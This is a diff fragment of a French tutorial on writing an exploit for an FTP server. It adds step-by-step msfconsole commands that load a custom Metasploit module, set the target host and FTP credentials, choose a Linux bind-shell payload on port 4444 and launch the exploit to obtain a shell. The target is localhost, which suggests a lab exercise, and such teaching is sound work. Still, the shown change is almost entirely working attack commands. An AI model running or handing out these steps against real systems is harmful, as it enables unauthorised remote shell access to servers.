@@ -184,6 +184,29 @@ if __name__ == "__main__":
     send_exploit()
 ```
 
-Il ne reste plus qu'à écrire l'exploit en ruby pour Metasploit :
+Il ne reste plus qu'à écrire l'exploit en ruby pour Metasploit et à l'utiliser avec la msfconsole :
 
-```ruby
+```bash
+cp 2ftp_exploit.rb ~/.msf4/modules/exploits/linux/ftp/
+
+# Lancer Metasploit
+msfconsole
+
+# Utiliser votre module
+msf6 > use exploit/linux/ftp/2ftpexploit
+msf6 exploit(linux/ftp/2ftpexploit) > show options
+
+# Configuration
+msf6 exploit(linux/ftp/2ftpexploit) > set RHOST 127.0.0.1
+msf6 exploit(linux/ftp/2ftpexploit) > set FTPUSER test
+msf6 exploit(linux/ftp/2ftpexploit) > set FTPPASS test
+
+# Choisir un payload
+msf6 exploit(linux/ftp/2ftpexploit) > set PAYLOAD linux/x86/shell_bind_tcp
+msf6 exploit(linux/ftp/2ftpexploit) > set LPORT 4444
+
+# Lancer l'exploit
+msf6 exploit(linux/ftp/2ftpexploit) > exploit
+
+# Si succès, vous devriez obtenir un shell
+```
